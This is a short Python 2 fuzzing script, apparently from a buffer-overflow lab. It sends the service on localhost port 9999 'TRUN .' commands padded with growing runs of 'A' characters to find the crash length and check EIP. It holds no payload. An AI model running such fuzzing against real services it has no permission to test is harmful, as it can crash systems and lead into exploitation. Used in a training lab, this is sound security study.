#!/usr/bin/env python
import socket
import sys

#  Fuzz length of input, each iteration 200 bytes larger than
#   the previous input to determine if program is susecptible
#   to a buffer overflow.

counter = 100
cmd = "TRUN ."
buffer = []

while len(buffer) <= 20:
    buffer.append(cmd + "A" * counter)
    counter = counter + 200


for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "Sending buffer length: %s " % (len(string) - len(cmd))
        #print string
        s.connect(('127.0.0.1',9999))
        data = s.recv(1024)

        s.send(string)
        data = s.recv(1024)

        s.close()
        #print "Check EIP!"
        print data

    except:
        print sys.exc_info()[0]
        print "you done screwed up, yo."

